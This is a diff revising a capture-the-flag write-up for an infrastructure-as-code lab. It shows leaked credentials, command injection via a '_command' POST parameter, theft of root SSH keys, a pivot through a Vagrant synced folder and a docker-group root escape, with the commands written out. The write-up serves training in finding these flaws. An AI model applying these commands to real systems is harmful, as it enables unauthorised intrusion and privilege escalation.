@@ -1,31 +1,17 @@
 
+# On-Premises IaC
 
-
-![](Pasted%20image%2020260614162149.png)
+![](images/on-premises-iac/thm_room_banner.png)
 
 
 ## The Environment
 
-After SSHing into the entry host as `entry:entry` and I transferred the IaC files to my AttackBox using SCP for easier analysis:
+After SSHing into the entry host as `entry:entry`, I transferred the IaC files to my AttackBox using SCP for easier analysis:
 
 
 ```bash
 scp -r entry@10.113.171.225:/home/entry/iac /root/iac_task
 ```
-
-```
-iac/
-├── Vagrantfile 
-└── provision/
-    └── roles/webapp/
-        ├── defaults/main.yml
-        ├── tasks/
-        │   ├── db-setup.yml
-        │   └── app-setup.yml
-        └── templates/
-            └── app.py 
-```
-
 
 ```
 .
@@ -74,8 +60,6 @@ I started with analysing config files - this is where most of the treasure was b
 
 `provision/variables/web.yml`:
 
-yaml
-
 ```yaml
 ui_admin_pass: Str0ngAdminP@ssw3rd
 ui_manager_pass: Str0ngManagerP@ssw3rd
@@ -85,8 +69,6 @@ vagrantPassword: $1$edsr5y$.aCg6VGPf2HHQ9Hl17ies. # "stealingMoneyFromBanks"
 
 
 `provision/roles/webapp/defaults/main.yml`:
-
-yaml
 
 ```yaml
 db_password: mysecretpasswd
@@ -104,7 +86,7 @@ cfg.vm.synced_folder "./provision", "/tmp/provision"
 
 The entire `/home/ubuntu/` directory on the host is mounted live into the webserver container. The comment in the file literally says _"Will remove later to harden"_. It was not removed. 
 
-### SSH key deployment without cleanup
+### Leftover deployment artifacts
 
 `tasks/app-setup.yml` copies a private key into the container's root SSH directory:
 
@@ -156,15 +138,9 @@ Having SSH open on the database container was a nice surprise!
 ---
 
 
-# Web app exploit  - flag 1
+## Web app exploit - flag 1
 
-Web app runs on `172.20.128.2:80`, a Docker network not directly accessible from my machine. I used SSH local port forwarding to tunnel it through the entry host:
-
-```bash
-ssh -L 8080:172.20.128.2:80 -N -f entry@10.113.171.225
-```
-
-Then I created a tunnel to connect to a web app via my browser, by using -L flag to specify local port forward (I used 8080), destination host (docker container hosting flask app on port 80). Flags -N and -f were used to specify that I only want tunnel to the machine and not execute any shell command, as well as to run tunnel in the background. 
+Web app runs on `172.20.128.2:80`, a Docker network not directly accessible from my machine. I created a tunnel to connect to a web app via my browser, by using -L flag to specify local port forward (I used 8080), destination host (docker container hosting flask app on port 80). Flags -N and -f were used to specify that I only want tunnel to the machine and not execute any shell command, as well as to run tunnel in the background. 
 
 ```
 ssh -L 8080:172.20.128.2:80 -N -f entry@10.113.171.225
@@ -175,44 +151,45 @@ With the tunnel running, `http://localhost:8080` showed a "Bucket List App" with
 
 
 
-![](Pasted%20image%2020260614182934.png)
+![](images/on-premises-iac/bucket_list_homepage.png)
 
-![](Pasted%20image%2020260614183231.png)
-
-
-When I clicked `(Dev) Test DB` I saw in the network tab:
-
-![](Pasted%20image%2020260614183331.png)
-
-![](Pasted%20image%2020260614183349.png)
-
-![](Pasted%20image%2020260614183436.png)
+![](images/on-premises-iac/login_page_test_db_button.png)
 
 
-I sent this to Burp Repeater and swapped the command for `whoami`.
+When I clicked `(Dev) Test DB` I saw in the network tab a POST request with a `_command` parameter set to `service mysql status`, and the page rendered back "MySQL Community Server 5.7.42 is running." — the literal output of that shell command.
 
-![](Pasted%20image%2020260614184104.png)
+![](images/on-premises-iac/testdb_response_headers.png)
+
+![](images/on-premises-iac/testdb_request_command_param.png)
+
+![](images/on-premises-iac/testdb_response_rendered.png)
+
+That's unauthenticated OS command execution. I sent this to Burp Repeater and swapped the command for `whoami`.
+
+![](images/on-premises-iac/burp_repeater_whoami_root.png)
 
 From here I could run arbitrary commands as root inside the webserver container.
 I've searched for the name of the first flag to discover its location. 
 
-![](Pasted%20image%2020260614184324.png)
+![](images/on-premises-iac/flag1_location_found.png)
 
 And finally the first flag itself. 
 
-![](Pasted%20image%2020260614184523.png)
+![](images/on-premises-iac/flag1_captured.png)
 
 
 
-Getting root id_rsa
+Time to verify at runtime what the static analysis predicted — I checked whether the key from `app-setup.yml` actually made it onto the live container.
 
-![](Pasted%20image%2020260614190708.png)
+![](images/on-premises-iac/root_ssh_dir_listing.png)
 
-![](Pasted%20image%2020260614190751.png)
+Confirmed: `/root/.ssh/id_rsa` was sitting there exactly as the Ansible task described.
+
+![](images/on-premises-iac/root_id_rsa_dumped.png)
 
 
 
-# TODO Title
+## Leaked Root SSH Key via Vagrant's Default Sync Folder - flag 2
 
 The hint for the next flag was: 
 
@@ -223,7 +200,7 @@ When a Vagrant deployment is performed, by default, Vagrant will create a local 
 Don't have to tell me twice!
 
 
-![](Pasted%20image%2020260614192626.png)
+![](images/on-premises-iac/vagrant_dir_listing.png)
 
 `_command=ls -la /vagrant/keys/`
 
@@ -235,7 +212,7 @@ drwxr-xr-x 5 1000 1000 4096 Jan 23  2024 ..
 ```
 
 
-![](Pasted%20image%2020260614193853.png)
+![](images/on-premises-iac/vagrant_key_dumped.png)
 
 I copied the private key and had a little derailing when trying to use it for a connection. 
 
@@ -250,15 +227,19 @@ After some debugging - the key had Windows-style line endings from copy pasting,
 cat id_rsa | tr -d '\r' > id_rsa_fixed
 ```
 
+```bash
+ssh -i id_rsa_fixed root@172.20.128.2
+```
+
 The second flag was waiting in root's home directory. 
 
-![](Pasted%20image%2020260614201510.png)
+![](images/on-premises-iac/flag2_captured.png)
 
 ## Pivoting to the Host via Synced Folder - flag 3
 
 Now inside the webserver container as root, I checked the mounted shares from the Vagrantfile:
 
-```Vagrantfile
+```ruby
 cfg.vm.synced_folder "./provision", "/tmp/provision"
 cfg.vm.synced_folder "/home/ubuntu/", "/tmp/datacopy"
 ```
@@ -290,24 +271,8 @@ ssh -i container_key ubuntu@172.20.128.1
 Flag 3 was in ubuntu's home directory.
 
 
-![](Pasted%20image%2020260614204953.png)
+![](images/on-premises-iac/flag3_captured.png)
 
-```
-ubuntu@tryhackme:~$ sudo -l
-Matching Defaults entries for ubuntu on tryhackme:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User ubuntu may run the following commands on tryhackme:
-    (ALL : ALL) ALL
-    (ALL) NOPASSWD: ALL
-    (ALL) NOPASSWD: ALL
-    (ALL) NOPASSWD: ALL
-    (ALL) NOPASSWD: ALL
-    (ALL) NOPASSWD: ALL
-ubuntu@tryhackme:~$ id
-uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),998(docker)
-```
 
 ## Docker Group Privilege Escalation - flag 4
 
@@ -318,8 +283,17 @@ ubuntu@tryhackme:~$ id
 uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),998(docker)
 ```
 
-Ubuntu is in the `docker` group. This is essentially equivalent to root access - anyone who can run `docker` can mount the host filesystem into a container and chroot into it.
+Ubuntu is in the `docker` group. This is essentially equivalent to root access - anyone who can run `docker` can mount the host filesystem into a container and chroot into it:
 
-![](Pasted%20image%2020260614205909.png)
+```bash
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# find / -name "flag4-of-4.txt" 2>/dev/null
+/root/flag4-of-4.txt
+# cat /root/flag4-of-4.txt
+```
+
+![](images/on-premises-iac/docker_group_escape_flag4.png)
 
 
